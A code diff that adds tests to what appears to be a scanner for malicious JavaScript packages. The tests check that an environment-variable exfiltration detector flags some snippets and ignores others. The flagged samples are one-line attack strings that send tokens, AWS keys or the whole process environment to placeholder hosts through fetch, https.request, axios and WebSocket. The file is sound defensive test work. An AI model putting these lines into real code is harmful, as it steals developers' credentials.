@@ -198,3 +198,30 @@ test("a pathologically nested file is unparseable, not a crash", () => {
   expect(p.signals.map((s) => s.id)).toContain("unparseable-file");
   expect(p.stats.unparsed).toBe(1);
 });
+
+describe("env-exfil-pattern follows the value", () => {
+  test.each([
+    ["URL concatenation", 'fetch("https://x.example.invalid/?t=" + process.env.NPM_TOKEN);'],
+    ["header through a variable", 'const t = process.env.GITHUB_TOKEN; fetch(u, { headers: { authorization: "Bearer " + t } });'],
+    ["destructured key", 'const { AWS_SECRET_ACCESS_KEY: k } = process.env; require("axios").post(u, { k });'],
+    ["request object write", 'const https = require("https"); const req = https.request(o); req.write(JSON.stringify(process.env)); req.end();'],
+    ["request object end through a variable", 'const req = require("https").request(o); const body = Object.entries(process.env); req.end(String(body));'],
+    ["chained end", 'require("https").request({ hostname: "x.example.invalid" }).end(process.env.NPM_TOKEN);'],
+    ["websocket send", 'const ws = new WebSocket(u); ws.send(JSON.stringify({ ...process.env }));'],
+    ["for…in loop variable", 'for (const k in process.env) fetch(u + k);'],
+    ["two-step variable chain", "const all = { ...process.env }; const payload = JSON.stringify(all); fetch(u, { method: 'POST', body: payload });"],
+  ])("flags: %s", (_, code) => {
+    const p = analyze({ "a.js": code });
+    expect(p.signals.map((s) => s.id)).toContain("env-exfil-pattern");
+    expect(p.signals[0]?.severity).toBe("critical");
+  });
+
+  test.each([
+    ["env passed to a child process, download elsewhere", 'const cp = require("child_process"); const env = { ...process.env, X: 1 }; cp.execSync("npm i", { env }); require("https").get("https://registry.example.invalid/x");'],
+    ["token checked, unrelated request", 'if (process.env.NPM_TOKEN) console.log("set"); fetch("https://x.example.invalid/");'],
+    ["token used locally", 'const t = process.env.GH_TOKEN; console.log(t.length); fetch(u);'],
+    ["npm's own lowercase config", 'fetch(u, { headers: { "user-agent": process.env.npm_config_user_agent } });'],
+  ])("does not flag: %s", (_, code) => {
+    expect(analyze({ "a.js": code }).signals.map((s) => s.id)).not.toContain("env-exfil-pattern");
+  });
+});
